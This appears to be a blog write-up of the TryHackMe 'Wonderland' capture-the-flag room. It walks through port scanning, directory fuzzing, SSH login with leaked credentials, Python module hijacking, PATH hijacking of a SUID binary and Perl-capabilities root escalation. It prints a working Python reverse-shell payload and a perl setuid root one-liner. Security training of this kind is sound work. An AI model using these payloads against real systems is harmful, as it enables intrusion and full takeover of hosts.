---
title: Wonderland
date: 2022-07-23 12:00:00 -0500
author: L15t3Nr
categories: [TryHackMe, WriteUp]
tag: [TryHackMe, WriteUp, Wonderland]
img_path: /assets/img/Wonderland/
---

Wonderland can be found [here](https://tryhackme.com/room/wonderland)

# Enumeration
## Nmap
The results of nmap
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDe20sKMgKSMTnyRTmZhXPxn+xLggGUemXZLJDkaGAkZSMgwM3taNTc8OaEku7BvbOkqoIya4ZI8vLuNdMnESFfB22kMWfkoB0zKCSWzaiOjvdMBw559UkLCZ3bgwDY2RudNYq5YEwtqQMFgeRCC1/rO4h4Hl0YjLJufYOoIbK0EPaClcDPYjp+E1xpbn3kqKMhyWDvfZ2ltU1Et2MkhmtJ6TH2HA+eFdyMEQ5SqX6aASSXM7OoUHwJJmptyr2aNeUXiytv7uwWHkIqk3vVrZBXsyjW4ebxC3v0/Oqd73UWd5epuNbYbBNls06YZDVI8wyZ0eYGKwjtogg5+h82rnWN
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHH2gIouNdIhId0iND9UFQByJZcff2CXQ5Esgx1L96L50cYaArAW3A3YP3VDg4tePrpavcPJC2IDonroSEeGj6M=
|   256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAsWAdr9g04J7Q8aeiWYg03WjPqGVS6aNf/LF+/hMyKh
80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Manual Inspection 
The home page contains only an image

![Home](Home.png)

## Fuzzing for Directories
Using Wfuzz, I enumerate directories
```
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --follow --hc 404 http://10.10.241.146/FUZZ/
```

One of the first results comes back as the '/r/' directory.

![r](r.png)

I had a feeling this was going to spell out the word 'rabbit', so I checked. 

![rabbitPage](rabbitPage.png)

There is a page here and checking the source reveals something interesting. 

There are credentials hidden in the page source. 

![sourceCredentials](sourceCredentials.png)

# Lateral Movement
### Alice

The credentials i found grant SSH access as the user 'alice'.

![SSHAlice](SSHAlice.png)

Digging into the users permissions reveals the ability to execute a python script as the user 'rabbit'

`sudo -l`
![sudo-l](sudo-l.png)


### Rabbit
The python script uses the 'random' module and this can exploited by abusing the way python looks up library modules. The first location python checks is the current directory. The random module is located at `/usr/lib/python3.6/random.py`. By placing a malicious file name 'random.py' in the current directory, python will find and use my module before it reaches the `	/usr/lib/python3.6/random.py` location. 

The payload I will use: 
```
import socket,os,pty  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("10.2.7.45",4242))  
os.dup2(s.fileno(),0)  
os.dup2(s.fileno(),1)  
os.dup2(s.fileno(),2)  
pty.spawn("/bin/sh")
```

and this will be stored in a file called 'random.py' in the directory containing the 'walrus_and_the_carpenter.py' script. 

Setting up a netcat listener on 4242 and then executing the script as the user rabbit will provide a reverse shell as the next user. 

`sudo -u rabbit python3.6 ~/walrus_and_the_carpenter.py`

![randomPY](randomPY.png)

![rabbitShell](rabbitShell.png)

### Hatter

The rabbit user contains a binary called 'teaParty' and their is a SUID set on the binary.

![SUID](SUID2.png)

I downloaded a strings static binary onto the target and inspected the strings in the binary.

![teaParty](teaParty.png)

This revealed that the binary uses the 'date' command without an absolute path. This way I can hijack the command with my own by added a malicious 'date' binary to the tmp directory and including the tmp directory in the path. 

![stringsResults](stringsResults.png)

the malicious date binary will contain a reverse shell payload and then be made executable

![newDate](newDate.png)

The tmp directory is also added to the path

![PATH](PATH.png)

A netcat listener is started on port 2345 and then the binary is executed for a reverse shell as the user Hatter

![TeaPartyExec](TeaPartyExec.png)

![HatterShell](HatterShell.png)

# Privilege Escalation
### Root
User hatter contains a password file in the home directory that I will use to login via SSH

![HatterPassword](HatterPassword.png)

![HatterSSH](HatterSSH.png)

I ran through the [Privilege Escalation Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) and found that the hatter user has capabilities set on Perl. 

![GetCap](GetCap.png)

There is a privilege escalation path found on [GTFO bins](https://gtfobins.github.io/gtfobins/perl/)

The payload: 
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

![root](rootWonderland.png)
